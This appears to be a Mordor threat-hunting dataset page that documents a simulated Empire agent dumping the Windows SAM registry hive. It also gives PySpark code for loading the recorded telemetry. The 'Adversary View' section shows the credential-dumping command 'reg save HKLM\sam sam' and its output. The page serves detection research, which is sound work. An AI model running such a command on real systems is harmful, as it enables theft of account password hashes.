# Empire Reg Dump SAM

## Metadata


|                   |    |
|:------------------|:---|
| id                | SDWIN-190625133822 |
| author            | Roberto Rodriguez @Cyb3rWard0g |
| creation date     | 2019/06/25 |
| platform          | Windows |
| Mordor Environment| Mordor shire |
| Simulation Type   | Interactive Session |
| Simulation Tool   | Remote Desktop Protocol |
| Simulation Script | None |
| Mordor Dataset    | https://raw.githubusercontent.com/OTRF/mordor/master/small_datasets/windows/credential_access/empire_reg_dump_sam.tar.gz |

## Dataset Description
This dataset represents adversaries with administrator privileges using the windows reg utility to dump the SAM registry hive.

## Adversary View
```
(Empire: Y298VW3B) > shell reg save HKLM\sam sam
[*] Tasked Y298VW3B to run TASK_SHELL
[*] Agent Y298VW3B tasked with task ID 5
(Empire: Y298VW3B) > The operation completed successfully.

..Command execution completed.

(Empire: Y298VW3B) >
```

## Explore Mordor Dataset

### Initialize Analytics Engine

from openhunt.mordorutils import *
spark = get_spark()

### Download & Process Mordor File

mordor_file = "https://raw.githubusercontent.com/OTRF/mordor/master/small_datasets/windows/credential_access/empire_reg_dump_sam.tar.gz"
registerMordorSQLTable(spark, mordor_file, "mordorTable")

### Get to know your data

df = spark.sql(
    '''
SELECT *
FROM mordorTable
    '''
)
df.printSchema()
        